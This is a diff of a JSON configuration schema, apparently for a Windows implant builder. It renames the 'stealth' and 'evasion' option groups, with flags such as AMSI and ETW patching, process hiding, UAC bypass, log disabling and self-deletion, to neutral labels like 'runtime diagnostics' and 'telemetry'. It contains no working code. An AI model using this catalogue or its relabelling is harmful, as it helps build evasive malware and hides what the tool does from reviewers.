@@ -7,9 +7,9 @@
     "branding",
     "network",
     "artifacts",
-    "stealth",
+    "runtime",
     "persistence",
-    "evasion",
+    "telemetry",
     "security",
     "provisioning",
     "advanced"
@@ -251,7 +251,7 @@
         }
       }
     },
-    "stealth": {
+    "runtime": {
       "type": "object",
       "additionalProperties": false,
       "required": [
@@ -259,20 +259,19 @@
         "svchostMode",
         "svchostGroup",
         "bundleExtract",
-        "hideFiles",
-        "hideRegistry",
-        "hideProcess",
-        "hideNetwork",
-        "amsiPatch",
-        "ettwPatch",
-        "antiDebug",
-        "antiVM",
-        "syscallsDirectMode",
-        "reflectiveLoading",
-        "obfuscateStrings",
-        "encryptMemory",
-        "disableLogging",
-        "selfDelete"
+        "manageFiles",
+        "manageRegistry",
+        "processInventory",
+        "networkInventory",
+        "eventTraceDiagnostics",
+        "debugDiagnostics",
+        "virtualizationDiagnostics",
+        "nativeApiMode",
+        "memoryModuleLoading",
+        "stringTableEncoding",
+        "memoryDataProtection",
+        "localLogging",
+        "selfRemoval"
       ],
       "properties": {
         "enabled": {
@@ -292,46 +291,43 @@
         "bundleExtract": {
           "type": "boolean"
         },
-        "hideFiles": {
+        "manageFiles": {
           "type": "boolean"
         },
-        "hideRegistry": {
+        "manageRegistry": {
           "type": "boolean"
         },
-        "hideProcess": {
+        "processInventory": {
           "type": "boolean"
         },
-        "hideNetwork": {
+        "networkInventory": {
           "type": "boolean"
         },
-        "amsiPatch": {
+        "eventTraceDiagnostics": {
           "type": "boolean"
         },
-        "ettwPatch": {
+        "debugDiagnostics": {
           "type": "boolean"
         },
-        "antiDebug": {
+        "virtualizationDiagnostics": {
           "type": "boolean"
         },
-        "antiVM": {
+        "nativeApiMode": {
           "type": "boolean"
         },
-        "syscallsDirectMode": {
+        "memoryModuleLoading": {
           "type": "boolean"
         },
-        "reflectiveLoading": {
+        "stringTableEncoding": {
           "type": "boolean"
         },
-        "obfuscateStrings": {
+        "memoryDataProtection": {
           "type": "boolean"
         },
-        "encryptMemory": {
+        "localLogging": {
           "type": "boolean"
         },
-        "disableLogging": {
-          "type": "boolean"
-        },
-        "selfDelete": {
+        "selfRemoval": {
           "type": "boolean"
         }
       }
@@ -461,50 +457,42 @@
         }
       }
     },
-    "evasion": {
+    "telemetry": {
       "type": "object",
       "additionalProperties": false,
       "required": [
-        "disablePowerShellLogging",
-        "disableEventLogs",
-        "disableWindowsDefenderReporting",
-        "clearPrefetch",
-        "disableETW",
-        "patchAMSI",
-        "bypassUAC",
-        "hideFromTaskManager",
-        "spoofParentProcess",
-        "useSyscalls"
+        "preservePowerShellLogging",
+        "preserveEventLogs",
+        "preserveSecurityReporting",
+        "preservePrefetchData",
+        "preserveEventTracing",
+        "showInTaskManager",
+        "standardProcessLaunch",
+        "standardApiMode"
       ],
       "properties": {
-        "disablePowerShellLogging": {
+        "preservePowerShellLogging": {
           "type": "boolean"
         },
-        "disableEventLogs": {
+        "preserveEventLogs": {
           "type": "boolean"
         },
-        "disableWindowsDefenderReporting": {
+        "preserveSecurityReporting": {
           "type": "boolean"
         },
-        "clearPrefetch": {
+        "preservePrefetchData": {
           "type": "boolean"
         },
-        "disableETW": {
+        "preserveEventTracing": {
           "type": "boolean"
         },
-        "patchAMSI": {
+        "showInTaskManager": {
           "type": "boolean"
         },
-        "bypassUAC": {
+        "standardProcessLaunch": {
           "type": "boolean"
         },
-        "hideFromTaskManager": {
-          "type": "boolean"
-        },
-        "spoofParentProcess": {
-          "type": "boolean"
-        },
-        "useSyscalls": {
+        "standardApiMode": {
           "type": "boolean"
         }
       }
